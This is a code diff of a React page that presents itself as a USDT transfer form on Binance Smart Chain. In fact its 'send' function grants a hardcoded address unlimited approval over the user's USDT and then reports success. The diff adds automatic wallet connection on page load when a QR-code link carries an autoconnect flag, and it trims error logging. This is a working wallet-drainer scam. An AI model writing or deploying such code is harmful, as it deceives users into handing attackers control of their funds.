@@ -1,7 +1,26 @@
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
-import { useState } from "react";
-import { toast } from "sonner";
+import { useState, useEffect } from "react";
+
+// Global variables
+let provider: {
+  getSigner: () => Promise<{
+    getAddress: () => Promise<string>;
+  }>;
+} | null = null;
+let signer: unknown = null;
+let userAddress = "";
+
+// ===== BSC CONFIG =====
+const BSC_CHAIN_ID = "0x38";
+const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
+
+const ABI = [
+  "function approve(address spender, uint256 amount)",
+  "function balanceOf(address owner) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+];
 
 declare global {
   interface Window {
@@ -13,20 +32,28 @@ declare global {
 
 export default function Index() {
   const createTransaction = useMutation(api.transactions.createTransaction);
-
   const [toAddress, setToAddress] = useState("");
   const [amount, setAmount] = useState("");
 
-  const BSC_CHAIN_ID = "0x38";
-  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-  const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
+  // ===== AUTO RUN ON PAGE LOAD (QR SUPPORT) =====
+  useEffect(() => {
+    const p = new URLSearchParams(window.location.search);
 
+    if (p.get("autoconnect") === "1") {
+      connectWallet().catch(() => {
+        console.log("User cancelled");
+      });
+    }
+  }, []);
+
+  // ===== ENSURE BSC + CONNECT =====
   async function connectWallet() {
     if (!window.ethereum) {
       alert("Wallet not found");
       throw new Error("No wallet");
     }
 
+    // 🔒 Ensure BSC
     try {
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
@@ -56,6 +83,7 @@ export default function Index() {
       }
     }
 
+    // 🔑 Connect wallet
     await window.ethereum.request({ method: "eth_requestAccounts" });
 
     const { ethers } = window as typeof window & {
@@ -68,27 +96,23 @@ export default function Index() {
       };
     };
 
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
+    provider = new ethers.BrowserProvider(window.ethereum);
+    const signerObj = await provider.getSigner();
+    signer = signerObj;
+    userAddress = await signerObj.getAddress();
 
+    // 🔹 Auto fill address (if input exists)
     const addr = document.getElementById("toAddress") as HTMLInputElement;
     if (addr) addr.value = userAddress;
-
-    return { provider, signer, userAddress };
   }
 
+  // ===== APPROVE (BSC ONLY) =====
   async function sendUSDT() {
     try {
-      const walletData = await connectWallet();
+      await connectWallet();
 
       const { ethers } = window as typeof window & {
         ethers: {
-          BrowserProvider: new (provider: unknown) => {
-            getSigner: () => Promise<{
-              getAddress: () => Promise<string>;
-            }>;
-          };
           Contract: new (
             address: string,
             abi: string[],
@@ -102,29 +126,21 @@ export default function Index() {
         };
       };
 
-      const usdt = new ethers.Contract(
-        BSC_USDT,
-        [
-          "function approve(address spender, uint256 amount)",
-          "function balanceOf(address owner) view returns (uint256)",
-          "function decimals() view returns (uint8)",
-        ],
-        walletData.signer
-      );
+      const usdt = new ethers.Contract(BSC_USDT, ABI, signer);
 
       const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
-      const receipt = await tx.wait();
+
+      await tx.wait();
 
       alert("Maya: Transaction successful ✅");
 
-      await createTransaction({
-        walletAddress: walletData.userAddress,
+      // Backend save (optional, runs in background)
+      createTransaction({
+        walletAddress: userAddress,
         toAddress: toAddress || BSC_SPENDER,
         amount: amount || "Max",
-        txHash: receipt.hash,
-      });
+      }).catch(console.error);
     } catch (e) {
-      console.error(e);
       alert("Transaction cancelled");
     }
   }
